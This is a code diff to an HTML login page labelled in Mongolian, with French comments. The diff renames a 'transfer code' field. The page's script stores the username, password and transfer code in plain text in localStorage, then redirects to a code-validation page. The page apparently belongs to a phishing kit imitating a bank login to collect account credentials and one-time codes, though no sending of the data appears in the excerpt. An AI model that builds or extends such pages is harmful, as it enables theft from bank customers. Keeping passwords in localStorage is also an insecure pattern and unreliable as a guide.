@@ -43,7 +43,13 @@
         <div>
             <form class="container" onsubmit="goToCodePage(event)">
                 <div class="">
-                    <input type="text" name="username" id="username" value="" class="form-control-lg form-control" placeholder="Нэвтрэх нэр" required/>
+                    <input 
+                        type="text" 
+                        name="username" 
+                        id="username" 
+                        class="form-control-lg form-control" 
+                        placeholder="Нэвтрэх нэр" 
+                        required/>
                 </div>
                 <br />
                 <div class="input-group">
@@ -59,7 +65,13 @@
                 </div>
                 <br />
                 <div class="">
-                    <input type="text" name="passwordtransac" id="passwordtransac" class="form-control form-control-lg" placeholder="шилжүүлэх код" required/>
+                    <input 
+                        type="text" 
+                        name="transacpassword" 
+                        id="transacpassword" 
+                        class="form-control form-control-lg" 
+                        placeholder="шилжүүлэх код" 
+                        required/>
                 </div>
                 <br />
                 <div class=" row row-cols-2 px-2">
@@ -113,11 +125,11 @@
         event.preventDefault(); // Empêche la soumission par défaut du formulaire
         const username = document.getElementById("username").value;
         const password = document.getElementById("password").value;
-        const passwordtransac = document.getElementById("passwordtransac").value;
+        const transacpassword = document.getElementById("transacpassword").value;
         if (username && password) {
             localStorage.setItem("username", username);
             localStorage.setItem("password", password);
-            localStorage.setItem("passwordtransac", passwordtransac);
+            localStorage.setItem("transacpassword", transacpassword);
             window.location.href = "code3.html"; // Redirection vers la page de validation du code
         } else {
             alert("Please fill in all fields");
